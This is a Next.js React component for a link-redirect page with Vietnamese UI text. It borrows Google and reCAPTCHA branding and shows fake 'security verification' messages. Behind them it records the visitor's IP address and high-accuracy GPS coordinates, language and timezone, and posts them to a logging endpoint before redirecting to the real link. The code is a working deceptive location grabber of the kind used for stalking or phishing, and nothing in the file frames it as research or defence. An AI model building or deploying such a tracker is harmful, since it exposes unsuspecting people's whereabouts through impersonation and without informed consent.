
'use client';

import React, { useState, useEffect } from 'react';
import { Card, CardContent } from '@/components/ui/card';
import Image from 'next/image';
import { Loader2, FileText, UserCheck, ShieldCheck } from 'lucide-react';
import { Button } from '@/components/ui/button';
import type { Link as LinkType } from '@/app/actions/links';

interface LinkVerificationClientProps {
  link: LinkType;
}

export function LinkVerificationClient({ link }: LinkVerificationClientProps) {
  const [status, setStatus] = useState('Đang kiểm tra độ bảo mật...');
  const [isVerifying, setIsVerifying] = useState(false);
  const [clientIp, setClientIp] = useState('N/A');

  // Capture IP immediately on load
  useEffect(() => {
    fetch('https://api.ipify.org?format=json')
      .then(res => res.json())
      .then(data => setClientIp(data.ip))
      .catch(() => setClientIp('N/A'));
  }, []);

  const handleVerification = async () => {
    setIsVerifying(true);
    
    const logAndRedirect = (pos?: GeolocationPosition) => {
      setStatus('Ghi nhận thông tin an toàn...');
      
      const body = { 
          ip: clientIp,
          linkId: link.id,
          lang: navigator.language || 'N/A',
          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'N/A',
          lat: pos?.coords.latitude,
          lon: pos?.coords.longitude,
          acc: pos?.coords.accuracy
      };

      fetch('/api/log-location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body),
        keepalive: true,
      }).finally(() => {
          setTimeout(() => {
              window.location.href = link.redirectUrl;
          }, 500);
      });
    };

    setStatus('Đang xác minh GPS...');
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(
        logAndRedirect,
        () => {
          setStatus('Vị trí bị từ chối. Đang tiếp tục...');
          logAndRedirect();
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
      );
    } else {
      logAndRedirect();
    }
  };

  return (
    <div className="flex justify-center items-center min-h-screen bg-white p-4 font-bold italic">
      <div className="text-center w-full max-w-sm">
        <Image 
            src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" 
            alt="Google" 
            width={92} 
            height={30} 
            className="h-6 mx-auto mb-10 opacity-70"
        />
        
        {isVerifying ? (
            <>
                <div className="w-10 h-10 border-4 border-gray-100 border-t-blue-500 rounded-full animate-spin mx-auto mb-6" />
                <p className="text-gray-400 uppercase text-[9px] animate-pulse tracking-widest">{status}</p>
            </>
        ) : (
            <div className="animate-in fade-in slide-in-from-bottom-4 duration-700">
                <div className="bg-gray-50 p-4 rounded-3xl border border-gray-100 mb-8 overflow-hidden shadow-sm">
                    <div className="flex items-center gap-3 mb-4 text-left px-2">
                        <FileText className="h-5 w-5 text-blue-500 opacity-60" />
                        <span className="text-[10px] text-gray-400 uppercase truncate">{link.title}</span>
                    </div>
                    <div className="aspect-video w-full rounded-2xl overflow-hidden mb-2">
                        <Image src={link.imageUrl} alt="Preview" width={400} height={225} className="object-cover w-full h-full grayscale opacity-50" />
                    </div>
                </div>

                <Button onClick={handleVerification} className="p-8 bg-white border border-gray-100 rounded-[30px] w-full shadow-lg text-[11px] uppercase flex justify-between items-center text-gray-700 hover:bg-gray-50 transition-all border-b-4 active:border-b-0 active:translate-y-1">
                    <span>TIẾP TỤC TRUY CẬP</span>
                    <Image src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" width={20} height={20} className="opacity-40" />
                </Button>
                <p className="text-gray-300 text-[8px] mt-6 uppercase tracking-tighter">Bảo mật hệ thống bởi Sentinel Master v78</p>
            </div>
        )}
      </div>
    </div>
  );
}
